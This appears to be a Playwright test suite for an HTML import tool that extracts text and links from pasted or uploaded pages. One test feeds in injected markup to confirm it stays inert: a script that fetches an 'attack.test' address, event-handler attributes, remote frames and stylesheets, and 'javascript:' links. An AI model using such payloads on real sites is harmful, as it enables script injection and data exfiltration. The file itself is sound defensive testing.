const {test,expect}=require('@playwright/test');
const cases=require('./fixtures/html-import/cases.json');
const input='<article class="markdown-body"><h1>見出し</h1><p>本文 <b>日本語</b></p><a href="/ref">参照</a></article>';
const source='https://example.test/dir/page';
async function open(page){await page.goto('/tools/html-import/');await page.locator('#source-url').fill(source);}
async function pasted(page, html=input){await page.locator('#html-input').fill(html);await page.locator('#paste-load').click();await expect(page.locator('#status')).toContainText('抽出しました');}
async function download(page){const pending=page.waitForEvent('download');await page.locator('#download').click();const d=await pending;const stream=await d.createReadStream();const chunks=[];for await(const c of stream)chunks.push(c);return JSON.parse(Buffer.concat(chunks).toString());}
for(const mobile of [false,true]){
 test.describe(mobile?'mobile':'desktop',()=>{
  test.use({viewport:mobile?{width:390,height:844}:{width:1440,height:900},isMobile:mobile,hasTouch:mobile});
  test('paste → extraction → conditions → download → clear',async({page},info)=>{
   await open(page);expect(await page.locator("#profile").evaluate(el=>getComputedStyle(el).colorScheme)).toBe("dark");await pasted(page);await expect(page.locator('#body-result')).toHaveText('見出し 本文 日本語 参照');
   await expect(page.locator('#links-result')).toContainText('https://example.test/ref');
   const first=await download(page);expect(first.snapshot.schema).toBe('html-snapshot/1');expect(first.snapshot.fetched_at).toBeNull();expect(first.snapshot).not.toHaveProperty('html');
   await page.locator('#html-input').fill('<p>not loaded</p>');await page.locator('#source-url').fill('https://changed.test/');
   await page.locator('#selector').fill('article > p');await page.locator('#apply').click();await expect(page.locator('#body-result')).toHaveText('本文 日本語');
   const second=await download(page);expect(second.snapshot).toEqual(first.snapshot);expect(second.extraction.source_url).toBe(source);
   await page.locator('#selector').fill('[id]');await page.locator('#apply').click();await expect(page.locator('#status')).toContainText('unsupported selector syntax');await expect(page.locator('#download')).toBeDisabled();
   await page.locator('#selector').fill('');await page.locator('#profile').selectOption('github-readme');await page.locator('#apply').click();await expect(page.locator('#body-result')).toContainText('見出し');
   expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
   await page.locator('#html-input').fill(input);await page.locator('#source-url').fill(source);
   await page.screenshot({path:info.outputPath('result.png'),fullPage:true});
   await page.locator('#clear').click();await expect(page.locator('#body-result')).toBeEmpty();await expect(page.locator('#html-input')).toHaveValue('');await expect(page.locator('#download')).toBeDisabled();
  });
  test('file is read once and is never refetched for condition changes',async({page})=>{
   await open(page);
   await page.evaluate(()=>{window.fileReads=0;const read=File.prototype.arrayBuffer;File.prototype.arrayBuffer=function(){window.fileReads++;return read.call(this);};});
   await page.locator('#file-input').setInputFiles({name:'sample.html',mimeType:'text/html',buffer:Buffer.from(input)});
   await expect(page.locator('#body-result')).toContainText('日本語');expect((await download(page)).input).toEqual({kind:'file',name:'sample.html'});
   await page.evaluate(()=>{File.prototype.arrayBuffer=()=>{throw Error('must not reread');};});
   await page.locator('#selector').fill('h1');await page.locator('#apply').click();await expect(page.locator('#body-result')).toHaveText('見出し');
   expect(await page.evaluate(()=>window.fileReads)).toBe(1);
  });
 });
}
test('shared Python/JS fixtures and explicit error contract',async({page})=>{
 await open(page);
 for(const c of cases){
  const observed=await page.evaluate(async c=>{const {parseHTML,extract}=await import('/tools/html-import/extract.mjs');try{return {result:extract(parseHTML(c.html),c.url,c.profile,c.selector)};}catch(e){return {error:e.message};}},c);
  expect(observed,c.name).toEqual(c.error?{error:c.error}:{result:c.expected});
 }
});
test('input scripts, handlers, frames and resources remain inert; no input storage or communication',async({page})=>{
 await open(page);await page.waitForLoadState('networkidle');
 const requests=[];page.on('request',r=>requests.push(r.url()));const dialogs=[];page.on('dialog',async d=>{dialogs.push(d.message());await d.dismiss();});
 await page.evaluate(()=>{window.inputExecuted=false;for(const key of ['localStorage','sessionStorage'])window[key].clear();});
 await pasted(page,`<article><h1>Safe</h1><p onclick="window.inputExecuted=true">Text</p><img src="https://attack.test/img" onerror="window.inputExecuted=true"><iframe src="https://attack.test/frame"></iframe><link rel="stylesheet" href="https://attack.test/style"><script>window.inputExecuted=true;fetch('https://attack.test/send');alert('bad')</script><style>@import 'https://attack.test/css';</style><template><p>hidden</p></template><noscript>hidden</noscript><a href="javascript:alert(1)">bad link</a></article>`);
 await page.locator('#selector').fill('p');await page.locator('#apply').click();await expect(page.locator('#body-result')).toHaveText('Text');
 expect(await page.evaluate(()=>window.inputExecuted)).toBe(false);expect(dialogs).toEqual([]);expect(requests).toEqual([]);
 expect(await page.evaluate(()=>[localStorage.length,sessionStorage.length])).toEqual([0,0]);expect(await page.locator('#body-result script,#body-result img,#body-result iframe').count()).toBe(0);
});
test('size, UTF-8, URL and depth failures clear stale downloads',async({page})=>{
 await open(page);await pasted(page);
 await page.locator('#file-input').setInputFiles({name:'bad.html',mimeType:'text/html',buffer:Buffer.from([0xff,0xfe])});await expect(page.locator('#download')).toBeDisabled();
 await page.locator('#file-input').setInputFiles({name:'big.html',mimeType:'text/html',buffer:Buffer.alloc(2*1024*1024+1,65)});await expect(page.locator('#status')).toContainText('2 MiB');
 await page.locator('#source-url').fill('javascript:alert(1)');await page.locator('#paste-load').click();await expect(page.locator('#status')).toContainText('HTTP(S)');
 await page.locator('#source-url').fill(source);await page.locator('#html-input').fill('<div>'.repeat(129)+'text'+'</div>'.repeat(129));await page.locator('#paste-load').click();await expect(page.locator('#status')).toContainText('128');
});
test('portfolio still exposes old tools and the new independent tool',async({page})=>{
 await page.goto('/');await expect(page.locator('a[href="./tools/html-import/"]')).toBeVisible();await expect(page.locator('a[href="./tools/mcp-toolcall-lab/"]')).toBeVisible();await expect(page.locator('#ironmate')).toBeVisible();
});
for(const mobile of [false,true]){
 test.describe(mobile?'mobile source navigation':'desktop source navigation',()=>{
  test.use({viewport:mobile?{width:390,height:844}:{width:1440,height:900},isMobile:mobile,hasTouch:mobile});
  test('selected source opens only on click in an isolated new tab',async({page,context})=>{
   await open(page);await pasted(page);await page.waitForLoadState('networkidle');
   const requests=[];let referer;
   context.on('request',r=>requests.push(r.url()));
   await context.route('https://source.example/chosen-source',async route=>{referer=route.request().headers().referer;await route.fulfill({contentType:'text/html',body:'<h1>Selected source</h1>'});});
   await page.locator('#source-url').fill('https://source.example/chosen-source');await expect(page.locator('#source-open')).toBeVisible();expect(requests).toEqual([]);
   const next=context.waitForEvent('page');await page.locator('#source-open').click();const popup=await next;await popup.waitForLoadState();expect(popup.url()).toBe('https://source.example/chosen-source');
   expect(await popup.evaluate(()=>window.opener)).toBeNull();expect(referer).toBeUndefined();await popup.close();
   await expect(page.locator('#body-result')).toHaveText('見出し 本文 日本語 参照');
   for(const invalid of ['javascript:alert(1)','ftp://example.test/','https://user:secret@example.test/','https://example.test\\bad']){
    await page.locator('#source-url').fill(invalid);await expect(page.locator('#source-open')).toBeHidden();await expect(page.locator('#source-open')).not.toHaveAttribute('href');
   }
  });
 });
}
